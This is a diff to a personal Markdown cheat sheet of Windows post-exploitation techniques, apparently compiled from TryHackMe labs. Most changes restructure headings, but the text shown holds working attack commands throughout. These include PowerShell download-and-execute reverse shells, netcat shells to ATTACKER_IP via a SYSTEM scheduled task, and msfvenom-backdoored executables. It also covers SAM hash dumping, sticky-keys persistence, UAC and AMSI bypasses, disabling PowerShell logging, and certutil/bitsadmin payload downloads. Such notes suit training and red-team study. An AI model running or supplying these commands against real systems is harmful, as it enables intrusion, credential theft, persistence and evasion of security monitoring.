@@ -1,30 +1,45 @@
-- [[#Tools|Tools]]
-- [[#Abusing Internals|Abusing Internals]]
-- [[#Commands|Commands]]
-- [[#Stabilize / Post Exploit / Persistance windows|Stabilize / Post Exploit / Persistance windows]]
-	- [[#Stabilize / Post Exploit / Persistance windows#Tampering with low users|Tampering with low users]]
-	- [[#Stabilize / Post Exploit / Persistance windows#Backdoor|Backdoor]]
-	- [[#Stabilize / Post Exploit / Persistance windows#Create/Modfiy Services|Create/Modfiy Services]]
-	- [[#Stabilize / Post Exploit / Persistance windows#Schedule Tasks|Schedule Tasks]]
-	- [[#Stabilize / Post Exploit / Persistance windows#Logon as Trigger|Logon as Trigger]]
-	- [[#Stabilize / Post Exploit / Persistance windows#Login Screen|Login Screen]]
-	- [[#Stabilize / Post Exploit / Persistance windows#Web shell | mssql|Web shell | mssql]]
-- [[#Powershell|Powershell]]
-	- [[#Powershell#Enumeration|Enumeration]]
-- [[#SMB - 445|SMB - 445]]
-	- [[#SMB - 445#SMBMAP|SMBMAP]]
-- [[#GUI bypass|GUI bypass]]
-- [[#Auto Elevating|Auto Elevating]]
-- [[#Enviroment Variable|Enviroment Variable]]
-- [[#File Operation|File Operation]]
-	- [[#File Operation#Certutil|Certutil]]
-	- [[#File Operation#BITSAdmin|BITSAdmin]]
-	- [[#File Operation#FindStr|FindStr]]
-	- [[#File Operation#Execution|Execution]]
-- [[#Privilege Escalation|Privilege Escalation]]
-	- [[#Privilege Escalation#Incognito|Incognito]]
 
-# Sysinternals
+- [Sysinternals](#sysinternals)
+  - [Tools](#tools)
+  - [Abusing Internals](#abusing-internals)
+  - [Commands](#commands)
+  - [Windows: get file](#windows-get-file)
+    - [Connecting with nc](#connecting-with-nc)
+  - [Enumerate](#enumerate)
+  - [Stabilize / Post Exploit / Persistance windows](#stabilize--post-exploit--persistance-windows)
+    - [Tampering with low users](#tampering-with-low-users)
+    - [Dump hashs](#dump-hashs)
+    - [crackmapexec](#crackmapexec)
+    - [Backdoor](#backdoor)
+    - [Create/Modfiy Services](#createmodfiy-services)
+    - [Schedule Tasks](#schedule-tasks)
+    - [Logon as Trigger](#logon-as-trigger)
+    - [Login Screen](#login-screen)
+    - [Web shell | mssql](#web-shell--mssql)
+  - [Powershell](#powershell)
+    - [Enumeration](#enumeration)
+  - [SMB - 445](#smb---445)
+    - [SMBMAP](#smbmap)
+- [RDP](#rdp)
+- [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
+  - [GUI bypass](#gui-bypass)
+  - [Auto Elevating](#auto-elevating)
+  - [Enviroment Variable](#enviroment-variable)
+- [Runtime Detection](#runtime-detection)
+- [Evade Logging](#evade-logging)
+- [Living Off the Land](#living-off-the-land)
+  - [File Operation](#file-operation)
+    - [Certutil](#certutil)
+    - [BITSAdmin](#bitsadmin)
+    - [FindStr](#findstr)
+    - [Execution](#execution)
+- [Bypass Applocker](#bypass-applocker)
+  - [Privilege Escalation](#privilege-escalation)
+    - [Incognito](#incognito)
+    - [Potato family](#potato-family)
+
+
+## Sysinternals
 - [LOLBAS](https://lolbas-project.github.io/#)
 - [Where Download](https://learn.microsoft.com/en-us/sysinternals/downloads/)
 - [Where Download 2](https://live.sysinternals.com/)
@@ -48,7 +63,7 @@
   - UPnP Device Host
 ```
 
-## Tools
+### Tools
 - Process analyser
   - Procmon, Process Explorer, Process Hacker 2
 - DLL
@@ -136,7 +151,7 @@
 - **Strings**
   - scan for UNICODE or ASCI
 
-## Abusing Internals
+### Abusing Internals
 - [Abusing Internals](https://tryhackme.com/room/abusingwindowsinternals)
 - Basic steps
   - Open process
@@ -153,7 +168,7 @@
 
 - [Malware hook](https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/)
 
-## Commands
+### Commands
 - powershell -exec bypass
 - powershell -ep bypass
 - systeminof
@@ -256,7 +271,7 @@
 
 - findstr = grep
 - 
-## Windows: get file
+### Windows: get file
   - powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
   
   - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://**IP_ATTACKER/FIlE**
@@ -271,9 +286,9 @@
   
   - copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')
 
-### Connecting with nc
+#### Connecting with nc
 - nc.exe TARGET PORT -e cmd.exe
-## Enumerate
+### Enumerate
 
 - **Check permisions**
   - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
@@ -281,9 +296,9 @@
 - Invoke Kereberosast script:
   - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
   
-## Stabilize / Post Exploit / Persistance windows
+### Stabilize / Post Exploit / Persistance windows
 
-### Tampering with low users
+#### Tampering with low users
 - Create user + add group admin
   - **net user USERNAME PASS /add**
   - **net localgroup {Administrators/"Backup Operators"| "Remote Management Users" | "Remote Desktop Users"} Username /add**
@@ -310,21 +325,21 @@
   - In: HKLM\SAM\SAM\Domains\Account\Users\
     - Change in F to value of admin in HEX(little endian)
 
-### Dump hashs
+#### Dump hashs
 reg.exe save hklm\sam C:\path\to\save\sam.save
 reg.exe save hklm\security C:\path\to\save\security.save
 reg.exe save hklm\system C:\path\to\save\system.save
 
 python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/Downloads/security.save -system /home/kali/Downloads/system.save LOCAL
 
-### crackmapexec
+#### crackmapexec
 - crackmapexec smb <target-ip> -u username -p password -M spider_plus
 cat /tmp/cme_spider_plus/<target-ip>.json
 - crackmapexec smb $target -u Administrator -p 123456 -x COMMAND_TO_EXECUTE
 - [crackmapexec](https://www.crackmapexec.wiki/)
 
 
-### Backdoor
+#### Backdoor
 - find executables and "batizar"
   - msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=10.11.26.251 lport=4444 -b "\x00" -f exe -o puttyX.exe
   - msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
@@ -334,7 +349,7 @@ cat /tmp/cme_spider_plus/<target-ip>.json
 - File association
   - HKLM\Software\Classes ==> reference to standard program = script to be loaded
 
-### Create/Modfiy Services
+#### Create/Modfiy Services
 - **Create**
   - sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
   - sc.exe start THMservice
@@ -353,7 +368,7 @@ cat /tmp/cme_spider_plus/<target-ip>.json
     - sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
     - sc.exe qc THMservice3
 
-### Schedule Tasks
+#### Schedule Tasks
 - schtasks
   - schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
 - Hidding the task
@@ -362,7 +377,7 @@ cat /tmp/cme_spider_plus/<target-ip>.json
   -  PsExec64.exe -s -i regedit
   -  Delete task
 
-### Logon as Trigger
+#### Logon as Trigger
 - **Executable on startup**
   - Folder User: AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
   - Folge ALL: ProgramData\Windows\Start Menu\Programs\Startup
@@ -391,7 +406,7 @@ cat /tmp/cme_spider_plus/<target-ip>.json
   - Assign logon script to user
   - HKCU\Environment ==> add Reg_Expand_Sy
 
-### Login Screen
+#### Login Screen
 - Sticky keys
   - 5 x shift = C:\Windows\System32\sethc.exe
   - take ownershipf of file + give permision + overwrite sethc,exe
@@ -402,11 +417,11 @@ cat /tmp/cme_spider_plus/<target-ip>.json
   - Ease access 
   - c:\Windows\System32\sethc.exe
 
-### Web shell | mssql
+#### Web shell | mssql
 - web shell to web directory
 - default web server: iis apppool\defaultapppool
 
-## Powershell
+### Powershell
 - .NET framkework: software plattform für windows
 - Commands = cmdlets
   - Verb-Noum
@@ -466,7 +481,7 @@ cat /tmp/cme_spider_plus/<target-ip>.json
     - $ENCODED = Get-Content -Path "C:\Users\Administrator\Desktop\b64.txt"  
   -  $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
   
-### Enumeration
+#### Enumeration
 - COMMAND | get-member
 - Get-LocalUser = show users
   - Where-Object {$_.SID -match 'S-1-5-21-1394777289-3961777894-1791813945-501'}
@@ -486,13 +501,15 @@ cat /tmp/cme_spider_plus/<target-ip>.json
 - Owner
   - Get-Acl
 
-## SMB - 445
+### SMB - 445
 - Server Message BLock
 - share of files on the network
 - Commands
   - smbclient -L \\IP => find shares
   - smbclient \\\\IP\\SHARENAME = open share
-    - smbclient -U username \\\\IP\\SHARENAME =
+    - smbclient -U username \\\\IP\\SHARENAME
+    - smbclient -L \\$target -U username
+
   - get ==> download file
   
 - Scripts
@@ -521,7 +538,7 @@ net use \\ATTACKER_IP\share /del
 
 - **enum4linux**
 
-### SMBMAP
+#### SMBMAP
 - Default
   - smbmap -H $target
   
@@ -541,7 +558,7 @@ net use \\ATTACKER_IP\share /del
   - -u: User
   - -p: password
 
-# RDP
+## RDP
 - Basic login
   - xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]
   - xfreerdp /v:IP /u:USERNAME /p:123456 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
@@ -550,7 +567,7 @@ net use \\ATTACKER_IP\share /del
 - Mount local folder:
   - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 
 
-# Bypass User Account Control (UAC)
+## Bypass User Account Control (UAC)
 - New Process are runned as non-privileged-account
 - Tokens
   - Normal user: 1
@@ -564,12 +581,12 @@ net use \\ATTACKER_IP\share /del
 
 [**Automated bypass**](https://github.com/hfiref0x/UACME)
 
-## GUI bypass
+### GUI bypass
 - **msconfig** RUNS with IL high
     - shell from msconfing = high
 - **azman.msc** ==> help ==> view source = open ==> all files
 
-## Auto Elevating
+### Auto Elevating
 - manifest ==> autoElevate (on/off)
 - Change default programm execution in HKEY_Current_USer
   
@@ -630,7 +647,7 @@ reg delete "HKCU\Software\Classes\.thm\" /f
 reg delete "HKCU\Software\Classes\ms-settings\" /f
 ```
 
-## Enviroment Variable
+### Enviroment Variable
 - Task scheduler
 - Rewrite Variable %windir% ==> HKCU\Environment
   - Add at the end = "&REM " = comment everything that exist after the variable name
@@ -648,7 +665,7 @@ schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
 reg delete "HKCU\Environment" /v "windir" /f
 ```
 
-# Runtime Detection
+## Runtime Detection
 - Scan code before execution
   - directly from memory
 - CRL = Common Language Runtime
@@ -680,7 +697,7 @@ full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.t
 .SetValue($null,$true)
 ```
 
-# Evade Logging
+## Evade Logging
 - Methodology
   - disable logging (1)
   - keep integrity (2)
@@ -741,7 +758,7 @@ $snap = Get-PSSnapin Microsoft.PowerShell.Core
 $snap.LogPipelineExecutionDetails = $false
 ```
 
-# Living Off the Land
+## Living Off the Land
 - Using and abusing of what exists
 - How
   - Reconnaissance
@@ -750,9 +767,9 @@ $snap.LogPipelineExecutionDetails = $false
   - Lateral movement
   - Security product bypass
 
-## File Operation
+### File Operation
 
-### Certutil
+#### Certutil
 - certification services
 - dump + diplay certfication authority
 - Ingress tool transfer
@@ -762,16 +779,16 @@ $snap.LogPipelineExecutionDetails = $false
   - certutil -encode payload.exe Encoded-payload.txt
   - certutil -decode Encoded_file payload.txt
 
-### BITSAdmin
+#### BITSAdmin
 - create,download, upload Background Intelligente Transfer Service (BITS = files from http and smb servers)
 - bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
 
-### FindStr
+#### FindStr
 - grep
 - used to download from SMB
   - findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
 
-### Execution
+#### Execution
 - Indirect command execution
 - **File Explorer**
   - explorer.exe /root,"C:\Windows\System32\calc.exe"
@@ -811,7 +828,7 @@ $snap.LogPipelineExecutionDetails = $false
   - python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
   - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
 
-# Bypass Applocker
+## Bypass Applocker
 - Applocker: restrict programs from being executed
 - Windows 7 default
   - whitelisted directory
@@ -819,14 +836,14 @@ $snap.LogPipelineExecutionDetails = $false
 - Windows history:
   - %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
-## Privilege Escalation
+### Privilege Escalation
 - Check privileges
 	- [Privileges options](https://hackersploit.org/windows-privilege-escalation-fundamentals/)
 - Check potatos
 	- [Potato family](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
 	- [Incognito.exe](https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f)
 
-### Incognito
+#### Incognito
 .\incognito.exe execute -c "domain\user" C:\Windows\system32\cmd.exe
 - Create user with admin:
 ```
@@ -834,7 +851,7 @@ $snap.LogPipelineExecutionDetails = $false
 .\incognito add_localgroup_user Administrators NAME
 ```
 
-### Potato family
+#### Potato family
 - [More info](https://0xaniket.medium.com/tryhackme-retro-walkthrough-b1197c3c05fb)
 - Privilege **SeImpersonatePrivilege** and/or **SeAssignPrimaryTokenPrivilege**
 - JuicyPotato
